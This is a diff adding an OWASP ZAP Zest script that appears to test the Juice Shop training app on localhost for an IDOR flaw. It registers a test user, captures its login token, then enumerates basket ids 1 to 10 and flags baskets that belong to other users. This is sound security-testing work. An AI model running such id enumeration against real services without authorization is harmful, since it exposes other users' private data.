@@ -1,0 +1,97 @@
+{
+  "about": "This is a Zest script. For more details about Zest visit https://github.com/zaproxy/zest/",
+  "zestVersion": "0.8",
+  "title": "juice-shop-idor-dynamic",
+  "description": "A dynamic standalone script to detect IDOR in Juice Shop basket access.",
+  "prefix": "",
+  "type": "StandAlone",
+  "parameters": {
+    "tokenStart": "{{",
+    "tokenEnd": "}}",
+    "tokens": {},
+    "elementType": "ZestVariables"
+  },
+  "statements": [
+    {
+      "url": "http://localhost:3000/api/Users/",
+      "method": "POST",
+      "data": "{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\",\"passwordRepeat\":\"ncc-1701\",\"securityQuestion\":{\"id\":1,\"answer\":\"blue\"}}",
+      "headers": "Content-Type: application/json\r\n",
+      "followRedirects": false,
+      "cookies": [],
+      "enabled": true,
+      "elementType": "ZestRequest"
+    },
+    {
+      "url": "http://localhost:3000/rest/user/login",
+      "method": "POST",
+      "data": "{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}",
+      "headers": "Content-Type: application/json\r\n",
+      "followRedirects": false,
+      "cookies": [],
+      "enabled": true,
+      "elementType": "ZestRequest",
+      "authentication": false,
+      "index": 1,
+      "set": {
+        "elementType": "ZestAssignString",
+        "variableName": "authToken",
+        "regexp": "\\\"token\\\":\\\"([^"]+)\\\""
+      }
+    },
+    {
+      "url": "http://localhost:3000/rest/user/whoami",
+      "method": "GET",
+      "headers": "Authorization: Bearer {{authToken}}\r\n",
+      "followRedirects": false,
+      "cookies": [],
+      "enabled": true,
+      "elementType": "ZestRequest",
+      "set": {
+        "elementType": "ZestAssignString",
+        "variableName": "myUserId",
+        "regexp": "\\\"id\\\":(\\d+)"
+      }
+    },
+    {
+      "loopType": "range",
+      "fromIndex": 1,
+      "toIndex": 10,
+      "indexVariableName": "i",
+      "elementType": "ZestLoopInteger",
+      "statements": [
+        {
+          "url": "http://localhost:3000/rest/basket/{{i}}",
+          "method": "GET",
+          "headers": "Authorization: Bearer {{authToken}}\r\n",
+          "followRedirects": false,
+          "cookies": [],
+          "enabled": true,
+          "elementType": "ZestRequest",
+          "set": {
+            "elementType": "ZestAssignString",
+            "variableName": "foundUserId",
+            "regexp": "\\\"UserId\\\":(\\d+)"
+          }
+        },
+        {
+          "rootExpression": {
+            "first": {
+              "elementType": "ZestExpressionRegex",
+              "variableName": "foundUserId",
+              "regex": "^(?!{{myUserId}}$).*"
+            },
+            "elementType": "ZestExpressionAnd"
+          },
+          "ifStatements": [
+            {
+              "message": "IDOR FOUND: Accessed basket of another user (BasketId={{i}}, UserId={{foundUserId}})",
+              "elementType": "ZestActionPrint"
+            }
+          ],
+          "elementType": "ZestConditional"
+        }
+      ]
+    }
+  ]
+}
